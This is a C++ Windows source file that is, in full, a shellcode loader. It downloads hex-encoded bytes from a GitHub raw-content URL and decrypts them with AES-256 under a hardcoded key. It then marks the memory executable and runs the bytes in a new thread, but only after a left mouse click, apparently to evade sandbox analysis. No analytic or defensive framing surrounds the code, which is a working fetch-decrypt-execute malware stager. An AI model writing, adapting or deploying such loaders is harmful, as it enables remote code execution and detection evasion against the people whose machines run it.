#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <iomanip>
#pragma comment(lib, "winhttp.lib")

std::string DownloadText(const std::wstring& host, const std::wstring& path) {
    HINTERNET hSession = WinHttpOpen(L"MyApp/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) return "";
    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
        path.c_str(),
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }
    BOOL bResult = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0,
        0, 0);
    if (bResult) {
        bResult = WinHttpReceiveResponse(hRequest, NULL);
    }
    std::string result;
    if (bResult) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            std::vector<char> buffer(dwSize + 1);
            if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
            result.append(buffer.data(), dwDownloaded);
        } while (dwSize > 0);
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

std::vector<unsigned char> ParseBytes(std::string text) {
    std::vector<unsigned char> bytes;
    std::stringstream ss(text);
    std::string item;
    while (std::getline(ss, item, ',')) {
        unsigned int value;
        std::stringstream(item) >> std::hex >> value;
        bytes.push_back(static_cast<unsigned char>(value));
    }
    return bytes;
}
void Decr(DWORD keyLen, BYTE* sh, DWORD& shL, unsigned char* key, int pr) {
    HCRYPTPROV hProv;
	pr=pr;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {return;}
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {return;}
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {return;}
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {return;}
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, sh, &shL)) {return;}
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);} 

int main() {
    std::wstring host = L"raw.githubusercontent.com";
    std::wstring path = L"/gaca9302/myproject/refs/heads/main/h1.txt";
    std::string text = DownloadText(host, path);
    std::vector<unsigned char> bytes = ParseBytes(text);
	
	SHORT prev = 0;
	while (true) {
		SHORT curr = GetAsyncKeyState(VK_LBUTTON);
		if ((curr & 0x8000) && !(prev & 0x8000)) {
			unsigned char key[] = {0x31,0x32,0x33};
			BYTE* sh = bytes.data();
			DWORD shL = static_cast<DWORD>(bytes.size());
			LPVOID alloc_mem = VirtualAlloc(NULL, bytes.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			Decr(sizeof(key), sh, shL, key, 5);
			MoveMemory(alloc_mem, sh, bytes.size());
			DWORD oldProtect;
			if (!VirtualProtect(alloc_mem, bytes.size(), PAGE_EXECUTE_READ, &oldProtect)) {return -2;}
			HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
			if (!tHandle) {return -3;}
			WaitForSingleObject(tHandle, INFINITE);
			((void(*)())alloc_mem)();
			break;
		}
		prev = curr;
		Sleep(10);
	}
    return 0;
}